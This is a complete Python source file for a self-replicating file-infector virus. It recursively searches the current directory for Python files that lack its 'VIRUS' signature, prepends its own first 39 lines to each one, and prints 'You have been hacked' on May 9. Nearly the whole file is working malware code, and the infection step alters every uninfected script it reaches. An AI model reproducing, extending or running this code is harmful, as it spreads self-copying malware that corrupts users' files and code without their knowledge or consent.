import os
import datetime

SIGNATURE = "VIRUS"

# Function finds all files it can infect
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If the current item in the path is a directory, recursively call 'locate' on that directory
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # If the file extension is '.py', check if it is infected by searching for the virus signature
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If the file is not infected, add it to the list of targeted files
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect the targeted files with the virus
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            # Copy the first 39 lines of the virus file into the 'virusstring'
            virusstring += line
    virus.close
    for fname in files_targeted:
        # Open each targeted file and append the contents of the virus string at the beginning
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

# Function to execute a payload if the current date is May 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # If the current date is May 9th, print the message "You have been hacked"
        print("You have been hacked")

# Locate all files to be targeted for potential infection in the current directory
files_targeted = locate(os.path.abspath(""))
# Infect the targeted files with the virus
infect(files_targeted)
# Execute the payload (print a message) if the current date is May 9th
detonate()
